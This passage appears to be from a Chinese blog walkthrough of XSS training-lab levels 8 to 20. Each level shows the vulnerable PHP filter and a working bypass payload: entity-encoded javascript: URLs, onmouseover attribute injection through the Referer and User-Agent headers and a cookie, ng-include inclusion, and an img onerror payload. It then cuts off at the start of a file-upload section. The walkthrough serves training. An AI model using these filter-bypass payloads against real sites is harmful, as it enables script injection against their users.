class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这一关用到了实体字符绕过，先提供一个<a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/zifushiti.php">转化为实体字符的网站</a></p>
<p>我们利用这句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;.$str7.&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;</span><br></pre></td></tr></table></figure>

<p>利用HTML字符实体构造【字符实体在后端显示为<code>&amp;#115;</code>，到了前端HTML页面转化为s，所以可以绕过后端】</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#115;cript:alert(/xss/)</span><br></pre></td></tr></table></figure>

<p>但要记住，这个必须要在输入框输入提交，不能在hackbar提交。因为此时&amp;会被当初GET参数之间的分隔符。</p>
<h2 id="Pass9【HTML字符实体绕过2】"><a href="#Pass9【HTML字符实体绕过2】" class="headerlink" title="Pass9【HTML字符实体绕过2】"></a>Pass9【HTML字符实体绕过2】</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">false</span>===<span class="title function_ invoke__">strpos</span>(<span class="variable">$str7</span>,<span class="string">&#x27;http://&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str7</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到相比于Pass8，多了这块</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">false</span>===<span class="title function_ invoke__">strpos</span>(<span class="variable">$str7</span>,<span class="string">&#x27;http://&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>所以我们构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#115;cript:alert(&#x27;http://&#x27;)</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#115;cript:alert(/xss/)//http://</span><br></pre></td></tr></table></figure>









<h2 id="Pass10【相同属性的覆盖】"><a href="#Pass10【相同属性的覆盖】" class="headerlink" title="Pass10【相同属性的覆盖】"></a>Pass10【相同属性的覆盖】</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们构造关于t_sort的payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ag&quot; onmouseover=&quot;javascript:alert(/xss/)&quot; type=&quot;text</span><br></pre></td></tr></table></figure>

<p>最后相当于【因为事件触发需要显示出这个text框，所以要把type属性改一下】</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;ag&quot; onmouseover=&quot;javascript:alert(/xss/)&quot; type=&quot;text&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>









<h2 id="Pass11【HTTP请求头1】"><a href="#Pass11【HTTP请求头1】" class="headerlink" title="Pass11【HTTP请求头1】"></a>Pass11【HTTP请求头1】</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/11-1.png" alt="11-1"></p>
<p>利用referer请求头传上一关的payload即可</p>
<h2 id="Pass12【HTTP请求头2】"><a href="#Pass12【HTTP请求头2】" class="headerlink" title="Pass12【HTTP请求头2】"></a>Pass12【HTTP请求头2】</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>差不多，就是换了个请求头</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/12-1.png" alt="12-1"></p>
<h2 id="Pass13【cookie传参】"><a href="#Pass13【cookie传参】" class="headerlink" title="Pass13【cookie传参】"></a>Pass13【cookie传参】</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;call me maybe?&quot;</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_COOKIE</span>[<span class="string">&quot;user&quot;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_cook&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload还是Pass10的，改一下cookie即可</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/13-1.png" alt="13-1"></p>
<h2 id="Pass14【exif】"><a href="#Pass14【exif】" class="headerlink" title="Pass14【exif】"></a>Pass14【exif】</h2><p>链接失效了，找机会自己复现一下</p>
<h2 id="Pass15【ng-include包含漏洞】"><a href="#Pass15【ng-include包含漏洞】" class="headerlink" title="Pass15【ng-include包含漏洞】"></a>Pass15【ng-include包含漏洞】</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;src&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ng-include可以包含一个文件或是html页面，<strong>意思就是我们可以利用src包含一个存在xss的页面。</strong></p>
<p>但是要记住格式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class=&quot;ng-include:&#x27;a.php&#x27;&quot;</span><br><span class="line">class=&#x27;ng-include:&quot;a.php&quot;&#x27;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>1.ng-include,如果单纯指定地址，必须要加引号</strong></p>
<p><strong>2.ng-include,加载外部html，script标签中的内容不执行</strong></p>
<p><strong>3.ng-include,加载外部html中含有style标签样式可以识别</strong></p>
</blockquote>
<p>选一个Pass构造，但是因为被单引号包裹，所以该Pass的构造里不能含有单引号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src=&#x27;level4.php?keyword=ag&quot; onmouseover=&quot;alert(/xss/)&#x27;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里虽然有htmlspecialchars，但是并不影响。</p>
<p>本人见解：在Pass15这个页面上，虽然我们看到对于Pass4页面的GET参数已经被实体化</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/15-1.png" alt="15-1"></p>
<p>但是这个请求会被发送到后端，这时这些实体就又变成以前的字符。而后端处理完请求，就把页面返回了，这个页面是一个整体，GET参数已经被实现了。</p>
</blockquote>
<h3 id="小问题"><a href="#小问题" class="headerlink" title="小问题"></a>小问题</h3><blockquote>
<p>这里虽然有htmlspecialchars，但是并不影响。</p>
</blockquote>
<p>这里引申出了htmlspecialchars的编码的有效域</p>
<p>还有ng-include包含文件的运作机制</p>
<h2 id="Pass16【img标签-0a换行】"><a href="#Pass16【img标签-0a换行】" class="headerlink" title="Pass16【img标签+%0a换行】"></a>Pass16【img标签+%0a换行】</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;	&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>.<span class="variable">$str5</span>.<span class="string">&quot;&lt;/center&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>利用img标签，但发现还过滤了空格，所以用%0a【换行】。</p>
<blockquote>
<p>在HTML中可以将%0a或者%0D当成空格使用。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img%0asrc=1%0aonerror=alert(&#x27;xss&#x27;)&gt;</span><br></pre></td></tr></table></figure>









<h2 id="Pass17【参数】"><a href="#Pass17【参数】" class="headerlink" title="Pass17【参数】"></a>Pass17【参数】</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;embed src=xsf01.swf?&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&quot; width=100% heigth=100%&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以给embed标签加属性</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01= onmouseover&amp;arg02=alert(/xss/)</span><br></pre></td></tr></table></figure>

<p>即</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;embed src=xsf01.swf? onmouseover=alert(/xss/) width=100% heigth=100%&gt;</span><br></pre></td></tr></table></figure>







<h2 id="Pass18【参数2】"><a href="#Pass18【参数2】" class="headerlink" title="Pass18【参数2】"></a>Pass18【参数2】</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;embed src=xsf02.swf?&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&quot; width=100% heigth=100%&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这不和Pass17一样吗。。。可能是swf文件有差别，但是目前还有些懵。</p>
<h2 id="Pass19【Flash-XSS】"><a href="#Pass19【Flash-XSS】" class="headerlink" title="Pass19【Flash XSS】"></a>Pass19【Flash XSS】</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u014029795/article/details/103213877">大佬文章</a></p>
<h2 id="Pass20【Flash-XSS（偏代码审计）】"><a href="#Pass20【Flash-XSS（偏代码审计）】" class="headerlink" title="Pass20【Flash XSS（偏代码审计）】"></a>Pass20【Flash XSS（偏代码审计）】</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u014029795/article/details/103217680">大佬文章</a></p>
<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>首先我所有有关的shell都放在了00ctftool2里的<u>一句话木马及其变体</u>文件夹内。</p>
<h2 id="Pass1【前端验证】"><a href="#Pass1【前端验证】" class="headerlink" title="Pass1【前端验证】"></a>Pass1【前端验证】</h2><p>这关是一个前端后缀名绕过：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = document.<span class="title function_ invoke__">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span 